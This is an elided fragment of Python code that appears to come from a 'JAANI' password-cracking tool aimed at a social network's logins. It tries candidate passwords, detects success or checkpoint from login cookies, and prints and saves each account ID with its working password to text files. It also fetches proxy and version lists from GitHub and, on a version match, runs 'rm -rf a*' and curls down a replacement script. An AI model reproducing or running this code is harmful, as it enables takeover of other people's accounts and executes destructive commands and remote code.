...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/JAANI/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/JAANI/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/JAANI/ali/main/ali.py > ali.py')
    ...
    try:
        for ps in pwx:
            ...
            if 'u_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\033[1;32m[JAANI-OK] '+uid+'|'+ps+'\033[0;97m')
                open('JAANI-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[141:152]
                print('\033[1;31m[JAANI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('JAANI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mITZ_JAANI\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
